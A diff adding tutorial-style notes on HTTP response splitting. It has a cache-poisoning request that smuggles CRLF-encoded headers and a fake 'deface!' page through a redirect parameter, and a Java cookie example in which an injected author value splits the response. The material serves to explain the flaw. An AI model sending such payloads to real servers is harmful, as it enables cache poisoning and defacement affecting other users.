@@ -325,6 +325,40 @@ Accept-Charset: iso-8859-1,*,utf-8
 
 HTTP header fields "Pragma: no-cache" or "Cache-Control: no-cache" will remove the page from cache (if the page is stored in cache, obviously)
 
+2- using HTTP Response Splitting we force cache server to generate two responses to one request 
+
+
+GET http://testsite.com/redir.php?site=%0d%0aContent-
+Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-
+Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aConte
+nt-Length:%2020%0d%0aContent-
+Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1
+Host: testsite.com
+User-Agent: Mozilla/4.7 [en] (WinNT; I)
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+image/png, */*
+Accept-Encoding: gzip
+Accept-Language: en
+Accept-Charset: iso-8859-1,*,utf-8
+
+
+Where we are intentionally setting the future time (in the header it's set to 27 October 2009) in the second header "Last-Modified" to store the response in the cache.
+We may get this effect by setting the following headers:
+	Last-Modified (checked by the If-Modified-Since header)
+
+	ETag (checked by the If-None_Match header)
+
+3- Sending request for the page, which we want to replace in the cache of the server.
+
+GET http://testsite.com/index.html HTTP/1.1
+Host: testsite.com
+User-Agent: Mozilla/4.7 [en] (WinNT; I)
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+image/png, */*
+Accept-Encoding: gzip
+Accept-Language: en
+Accept-Charset: iso-8859-1,*,utf-8
+
 
 
 ------Cross-User Defacement------
@@ -370,5 +404,45 @@ the data in an HTTP response header.
     These characters not only give attackers control of the remaining headers and 
     body of the response the app intends to send, but also allows them to 
     create addtiional responses entirely under their control.
+
+/Examples/
+Using Java as an example (all modern Java EE application servers ought to have this
+fixed by now, though) the following code segment reads the name of the author of 
+a weblog entry, author, from an HTTP request, and sets it in a cookie header of
+an HTTP response. 
+
+    String author = request.getParameter(AUTHOR_PARAM); 
+    ...
+    Cookie cookie = new Cookie("author", author);
+        cookie.setMaxAge(cookieExpiration);
+        response.addCookie(cookie);
+
+Assuming a string consisting of standard alpha-numeric characters, such
+as "jane smith" is submitted in the request, the HTTP response, including this
+cookie, might take the following form: 
+
+    HTTP/1.1 200 OK 
+    ...
+    Set-Cookie: author=Jane Smith
+    ...
+
+However!  Because the value of the cookie is formed of unvalidated user input,
+the response will only maintain this form i fthe value submitted
+for AUTHOR_PARAM doesn't contain any CR and LF characters. 
+
+If an attacker submits a malicious string, such as 
+    "Wiley Hacker\r\nContent-Length:999\r\n\r\n..."
+Then the HTTP response would be split into an imposter 
+response, followed by the original response, which is now ignored:
+
+    HTTP/1.1 200 OK 
+    ...
+    Set-Cookie: author=Wiley Hacker
+    Content-Length: 999
+
+    <html>malicious content...</html> (to 999th character in this example)
+    Original content starting with character 1000, which is now ignored by 
+    the web browser...
+
 
 
